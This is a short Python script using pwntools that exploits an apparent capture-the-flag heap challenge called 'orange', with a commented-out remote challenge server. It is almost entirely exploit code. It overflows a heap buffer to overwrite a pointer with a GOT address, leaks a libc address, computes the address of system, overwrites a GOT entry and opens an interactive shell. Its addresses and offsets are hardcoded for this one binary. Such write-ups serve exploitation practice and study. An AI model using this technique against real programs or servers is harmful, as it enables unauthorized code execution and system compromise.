from pwn import *

p = process("./orange")
#p = remote("kshgroup.kr",1216)
e = ELF("./orange")

puts_plt = 0x555555554880
malloc_got = 0x555555756048
write_got = 0x555555756020

def read(size,data):
    p.sendlineafter(">>","1")
    p.sendlineafter("Size: ",str(size))
    p.sendlineafter(">>",data)

def re_read(index,data):
    p.sendlineafter(">>","2")
    p.sendlineafter("Index: ",str(index))
    p.sendlineafter(">>",data)

def write(index):
    p.sendlineafter(">>","3")
    p.sendlineafter("Index: ",str(index))
    p.recvuntil("- Contents -\n")

read(16,"AAAAAAAA")
read(16,"BBBBBBBB")

payload = 'A'*32
payload += p64(write_got)

re_read(0,payload)

write(1)

libc_base = u64(p.recv(6).strip().ljust(8,"\x00"))
log.info("Address of base : "+str(hex(libc_base)))

system_addr = libc_base - 0xc0d00
log.info("Address of system : "+str(hex(system_addr)))

re_read(1,p64(system_addr))


p.interactive()
